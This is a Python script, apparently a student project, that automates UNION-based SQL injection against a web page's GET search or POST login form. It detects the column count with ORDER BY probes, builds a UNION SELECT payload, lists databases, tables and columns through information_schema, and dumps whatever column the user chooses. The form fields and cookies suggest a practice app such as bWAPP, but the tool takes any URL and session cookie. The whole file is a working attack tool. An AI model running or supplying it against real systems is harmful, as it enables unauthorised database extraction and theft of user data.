# project : SQL injection
# 1조 강민정, 이재성
#

def Column_Cnt() :  # cloumn 수 알아내는 함수
    n = 0           # 변수 설정
    
    while True :    # 무한 반복문 , # 매반복마다 mySQL이 전달하는 오류문을 검사
        n += 1      # 반복마다 n의값 1 증가
        
        order_by_query = "a' or 1=1 order by %d; #"%(n)     # column의 수를 알기 위한 SQL문

        if method_num == 0 :
            params = { 'title' : order_by_query, 'action' : 'search'}                 # 변수 딕셔너리
            response = requests.get(url, cookies=seesion, params=params).text         # GET형식에 맞춰 URL, cookie, 변수 전달
            html = bs(response,'html.parser')                   
            error_string = html.find_all(string="Error: Unknown column '%d' in 'order clause'"%(n)) 
         
        elif method_num == 1 :
            params = { 'login' : order_by_query, "password" : " " ,'form' : 'submit'} # 변수 딕셔너리
            response = requests.post(url, cookies=seesion, data=params).text          # POST형식에 맞춰 URL, cookie, 변수 전달
            html = bs(response,'html.parser')                   
            error_string = html.find_all(string="\nError: Unknown column '%d' in 'order clause'"%(n)) 
           
        if error_string != []:               # html에서 오류문을 찾으면 
            n-=1                             # n의 값을 1 감소시키고
            break                            # 반복문 탈출

    return n                                 #반복문을 통해 얻은 n(column의 수)를 반환



def make_Union(colCnt) :    # Union query 만들어주는 함수 , "a' UNION SELECT 1,2,....n; #" 를 만드는 함수
    
    make_union = "a' UNION SELECT " 
    
    for i in range(0,colCnt) :       # 1 ~ column 수만큼 반복 
        make_union += str(numlist[i])
        
        if i < colCnt-1 :             # 마지막 전까지는 , 붙여줌 
            make_union += ','
        
    make_union += "; #"         
    return make_union               # colCnt함수를 통해 얻은 column의 개수를 통해 query문 반



def tag(union_query) : # 웹페이지에서 출력되는 n(query문에서 숫자값)의 위치를 찾는 함수
    index = -1         # -1로 초기화
    
    if method_num == 0 :
        params = { 'title' : union_query, 'action' : 'search'}
        response = requests.get(url, cookies=seesion, params=params).text
        html = bs(response,'html.parser')
        col = html.find_all('td')           # 1번 search/get 에서는 조작할 수 있는 data 값앞에 <td> 태그가 있는것을 확인

    elif method_num == 1 :
        params = { 'login' : union_query, "password" : " " ,'form' : 'submit'}
        response = requests.post(url, cookies=seesion, data=params).text        
        html = bs(response,'html.parser')                    
        col = html.find_all('b')            # 2번 login/HERO 에서는 조작할 수 있는 data 값앞에 <b> 태그가 있는것을 확인
      
    for i in range(0, len(col)):            # 중첩 반복문을 통해 index값 초기화
        for j in range(0, len(numlist)):
            if (col[i].get_text() == str(numlist[j])):   
                index = i
                break           
        if index != -1:
            break
 
    return index, col           # 현재 url의 html문서에서 태그가 붙은 모든 문자열과  조작할 수 있는 data의 위치(index)를 반환




def find_dbName(union_query) :  # DB명 알아내는 함수

    tag_index, col_num = tag(union_query)   
    dbList = []
    n = 0

    #query 문 수정
    union_query = union_query.replace(col_num[tag_index].text,'(SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 0,1)')
    
    while True:
        if method_num == 0 :
            params = { 'title' : union_query, 'action' : 'search'}              # 수정된 query문을 통해 data를 확인
            response = requests.get(url, cookies=seesion, params=params).text
            html = bs(response,'html.parser')
            result = html.find_all('td')

            if result[tag_index].get_text() == '' : # 결과가 안나오면 반복 종료
                break
            
        elif method_num == 1 :
            params = { 'login' : union_query, "password" : " " ,'form' : 'submit'} # 수정된 query문을 통해 data를 확인
            response = requests.post(url, cookies=seesion, data=params).text       
            html = bs(response,'html.parser')                   
            result = html.find_all('b')             

            if len(col_num) != len(result) :        # query문을 통해 얻는 페이지에서 data가 나타나지 않으면 반복 종료
                break
            
        dbList.append(result[tag_index].text)
        n += 1
        union_query = union_query.replace('LIMIT %d,1'%(n-1),'LIMIT %d,1'%(n))

    # 반복 종료 후 찾은 리스트 출력
    n = 0
    print("-------DATABASE NAME-------")
    for i in dbList :
        n+=1
        print("[%d]" %n, i)

    print("---------------------------\n")
    
    return dbList



def find_table(union_query,dbList) :    # 선택한 DB의 table을 출력하는 함수
    tableList = []
    n = 0
    dbName = input("DB를 선택하세요: ")
    
    if dbName not in dbList :
        print("존재하지 않는 DB입니다.")
        exit()

    tag_index, col_num = tag(union_query)

    #query 문 수정
    union_query = union_query.replace(
        col_num[tag_index].text,"(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='%s' LIMIT 0,1)"%(dbName))

    while True:
        if method_num == 0 :
            params = { 'title' : union_query, 'action' : 'search'}                  # 수정된 query문을 통해 data를 확인
            response = requests.get(url, cookies=seesion, params=params).text
            html = bs(response,'html.parser')
            result = html.find_all('td')

            if result[tag_index].get_text() == '' : # 결과가 안나오면 반복 종료
                break

        elif method_num == 1 :
            params = { 'login' : union_query, "password" : " " ,'form' : 'submit'}   # 수정된 query문을 통해 data를 확인
            response = requests.post(url, cookies=seesion, data=params).text        
            html = bs(response,'html.parser')                   
            result = html.find_all('b')

            if len(col_num) != len(result) :        # query문을 통해 얻는 페이지에서 data가 나타나지 않으면 반복 종료
                break

        tableList.append(result[tag_index].text)
        n += 1
        union_query = union_query.replace('LIMIT %d,1'%(n-1),'LIMIT %d,1'%(n))


    # 반복 종료 후 찾은 리스트 출력
    n = 0
    print("\n---DB [%s]:TABLE NAME---" %dbName)
    for i in tableList :
        n+=1
        print("[%d]" %n, i)

    print("---------------------------\n")
       
    return tableList




def find_column(union_query,tableList) : # 선택한 table의 col 출력하는 함

    colList = []
    n = 0

    tableName = input("table을 선택하세요: ")

    if tableName not in tableList :
        print("존재하지 않는 table입니다.")
        exit()

    tag_index, col_num = tag(union_query)

    # union 쿼리 수정
    union_query = union_query.replace(
        col_num[tag_index].text,"(SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME = '%s' LIMIT 0,1)"%(tableName))
    
    while True:
       
        if method_num == 0 :    
            params = { 'title' : union_query, 'action' : 'search'}                  # 수정된 query문을 통해 data를 확인
            response = requests.get(url, cookies=seesion, params=params).text
            html = bs(response,'html.parser')
            result = html.find_all('td')

            if result[tag_index].get_text() == '' : # 결과가 안나오면 반복 종료
                break

        elif method_num == 1 :
            params = { 'login' : union_query, "password" : " " ,'form' : 'submit'}     # 수정된 query문을 통해 data를 확인
            response = requests.post(url, cookies=seesion, data=params).text          
            html = bs(response,'html.parser')                  
            result = html.find_all('b')

            if len(col_num) != len(result) :        # query문을 통해 얻는 페이지에서 data가 나타나지 않으면 반복 종료
                break

        colList.append(result[tag_index].text)
        n += 1
        union_query = union_query.replace('LIMIT %d,1'%(n-1),'LIMIT %d,1'%(n))

    # 반복 종료 후 찾은 리스트 출력
    n = 0
    print("\n--table[%s]:COLUMN NAME--" %tableName)
    for i in colList :
        n+=1
        print("[%d]" %n, i)
    print("---------------------------\n")
    
    return colList, tableName  # column 리스트와 테이블명 반환



def find_data(union_query, colList, tableName) :
    
    dataList = []
    n = 0

    # 사용자가 원하는 컬럼명을 입력
    colName = input("확인하고 싶은 컬럼을 선택하세요: ")


    if colName not in colList :
        print("존재하지 않는 column입니다. 다시 입력하세요.")
        exit()

    tag_index, col_num = tag(union_query)

    # union 쿼리 수정
    union_query = union_query.replace(
        col_num[tag_index].text," (SELECT %s FROM %s WHERE 1 LIMIT 0,1)"%(colName,tableName))
    
    while True :

       if method_num == 0 :
            params = { 'title' : union_query, 'action' : 'search'}                  # 수정된 query문을 통해 data를 확인
            response = requests.get(url, cookies=seesion, params=params).text
            html = bs(response,'html.parser')
            result = html.find_all('td')
            
            if result[tag_index].get_text() == '' :         # 결과가 안나오면 반복 종료
                break

       elif method_num == 1 :
            params = { 'login' : union_query, "password" : " " ,'form' : 'submit'}  # 수정된 query문을 통해 data를 확인
            response = requests.post(url, cookies=seesion, data=params).text         
            html = bs(response,'html.parser')                   
            result = html.find_all('b')
            
            if len(col_num) != len(result) :                # query문을 통해 얻는 페이지에서 data가 나타나지 않으면 반복 종료
                break

       dataList.append(result[tag_index].text)
       n += 1
       union_query = union_query.replace('LIMIT %d,1'%(n-1),'LIMIT %d,1'%(n))

    # 반복 종료 후 찾은 리스트 출력
    print("\n----column [%s]:data----" %colName)
    n = 0
    for i in dataList :
        n+=1
        print("[%d]" %n, i)
    print("---------------------------\n")
    
    return dataList  # data 리스트 반환


def main() :     # main 함수
    
    colCnt = Column_Cnt()           # column 수 확인
        
    # 컬럼 수만큼 정수 리스트 만듦
    for num in range(1,colCnt+1):
        numlist.append(num)
        
    union_query = make_Union(colCnt)        # query문 생성 
    dbList = find_dbName(union_query)       # query문 전달을 통해 db확인
    tableList = find_table(union_query, dbList)                 # 입력을 통해 선택된 db의 table 확인
    colList, tableName = find_column(union_query,tableList)     # table의 column 확인
    find_data(union_query, colList, tableName)                  # data 출력


#if __name__ == "__main__":
#   main()

import requests                     # requests
from bs4 import BeautifulSoup as bs # BeautifulSoup

global method_num                # 전역변수 설정 
global params
global response
global html
numlist =[]

url = input("URL: ")                                                                       # 따옴표 제외
seesion = {'PHPSESSID': input("PHPSESSID: "), 'security_level': input("security_level: ")} # 따옴표 제외


if ( (requests.get(url,cookies=seesion).text.find('method="GET"') != -1 ) or
     ( requests.get(url,cookies=seesion).text.find('method="get"') != -1 ) ) :
    method_num = 0      #get 방식
    
elif ( (requests.get(url,cookies=seesion).text.find('method="POST"') != -1 ) or
       ( requests.get(url,cookies=seesion).text.find('method="post"') != -1 )):
    method_num = 1      #post 방식
    
else :
    print("exit!!!!")
    exit()

main()
